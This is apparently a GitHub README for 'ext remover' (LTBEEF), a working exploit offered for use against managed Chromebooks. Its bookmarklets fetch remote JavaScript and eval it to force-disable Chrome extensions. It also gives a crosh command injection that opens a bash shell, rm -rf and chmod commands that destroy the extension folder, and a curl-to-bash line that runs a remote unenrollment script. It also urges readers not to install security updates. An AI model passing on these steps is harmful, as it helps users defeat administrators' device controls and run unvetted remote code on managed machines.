# ext remover

![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)

Bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF.

**DO NOT UPDATE YOUR CHROMEBOOK! This exploit has been patched in versions 106 and above, so do not update!** If you version is above 106, [try this method](https://github.com/3kh0/ext-remover#v106-and-above)

If you need any help, please go here: https://github.com/3kh0/ext-remover/discussions

## Instructions

Here are the instructions to using this exploit! There are two ways, using the GUI and using the ids, the GUI method is better.

### Ingot (GUI)

Credit to Nebelung for this, [link to the github](https://github.com/FogNetwork/Ingot)

For easy setup go the the website at https://fognetwork.github.io/Ingot

1. Show your bookmarks bar with `ctrl + shift + b`
2. Right click on the bar and choose `Add Page`
3. Set the name to `Ingot` and the URL to the code below or [here](https://github.com/FogNetwork/Ingot/blob/main/bookmarklet.js)

```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```
**If this helped please give me a star!**

![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)

### Using the GUI

Credit to CompactCow#4717 for the amazing UI!

1. Right click on the bar and choose `Add Page`
1. Set the name to `GUI` and the URL to the code below or [here](https://github.com/3kh0/ext-remover/blob/main/gui.js)
```js
javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```
3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
4. Click the bookmark (Make sure you are on the page above!)
5. Use the menu to toggle your extensions!

**If this helped please give me a star!**

![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)

### Using IDs

#### Disabling 

1. Visit chrome://extensions and on the extension you want to disable click on Details
2. Copy the text in the URL after the `?id=`
> For example if you have this URL: `chrome://extensions/?id=echoontop` you would only copy `echoontop`
3.  Go to the file [`bookmark.js`](https://github.com/3kh0/ext-remover/blob/main/bookmark.js) and copy everything and create a new bookmark and use the code you copied as the Page URL
4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
5. Click the bookmark (Make sure you are on the page above!)
6.  Put the ID you copied into the text box.

You're done! The extension should now be disabled.

**If this helped please give me a star!**

#### Enabling

1. Visit chrome://extensions and on the extension you want to enable click on Details
2. Click View in Chrome Web Store
3. You will see a banner at the top of the page that says This item has been disabled in Chrome. Enable this item
4. Click on Enable this item

You're done! The extension should now be enabled.

**If this helped please give me a star!**

Credit bypassi for finding and making this exploit!

## How does it work
Well, it's pretty basic. It finds extensions and displays them on this page with some toggle switches.

![image](https://yeeteeyt.github.io/exploitbranch.png)

then, it detects when the toggle switch is toggled, and for what extension, then compiles a message to chrome that says "hey, turn this off for me". Chrome, mistaking this for the webstore complies.

![image](https://yeeteeyt.github.io/exploitgrid.png)

## v106 and above

This exploit details another way to permanently delete extensions. Once done, you can update or restart your chromebook and the extensions will stay gone until you powerwash.

You need a usb for downgrading, and rudimentary knowledge of bash is recommended

STEPS:
1. Downgrade to any version below 101. Instructions are in [Chrome100.dev](https://chrome100.dev).
2. Hit `ctrl+alt+t` to open a crosh window. If it’s blocked by extensions, use LTBEEF. If it’s policy blocked (“The person who set up this computer has chosen to block this site”) you can try downgrading to a version below 90, where crosh had a different URL.
3. Type in `set_cellular_ppp \';bash;exit;\'` and hit enter. 
4. You now have access to a bash shell, logged in as chronos. More information about the permissions of this shell is at the bottom.
5. Type `rm -rf ~/Extensions/*`. **THIS WILL BREAK EVERY EXTENSION ON YOUR CHROMEBOOK.** If there are extensions you want to keep, they can be selectively removed by ID using `rm -rf ~/Extensions/InsertIdHere`
6. Run `chmod 000 ~/Extensions`. This marks the extension folder as read only, stopping it from updating in the future or any new extensions from being installed.
7. You can now restart chrome, allowing it to update to the latest version. Once rebooted onto the latest version, all removed extensions will have the default icon and won’t function at all.

**Things you can’t do**
1. Run sudo or su into root. There might be ways to privilege escalate to root using disclosed chromium bug reports, but at the moment I have not gotten any of them to work on managed chromebooks
2. Enable dev mode or use dev mode things
3. Write to certain protected folders
4. Install packages
5. Install your own extensions. There is no way that known of (right now) to do that, so don’t ask. Please suggest any ideas.
6. Modify an existing extension. Extensions are checksummed before running, so any modification will result in chrome thinking the extension is “corrupted” and trying to redownload it, failing if the directory is marked readonly

If anyone knows some fun commands for the bash shell to break things even further, let me know!

Thanks to CoolElectronics for finding this amazing trick, trent:gra.im and justinchrm for helping with some parts, and the discoverer of the original bash shell exploit found here https://bugs.chromium.org/p/chromium/issues/detail?id=1329945

### Full unenrollment

**Note: This only works on version 101!**

Run the following commands in crosh:
```bash
set_cellular_ppp \';bash;exit;\'
bash <(curl https://coolelectronics.me/unenroll101.sh)
```
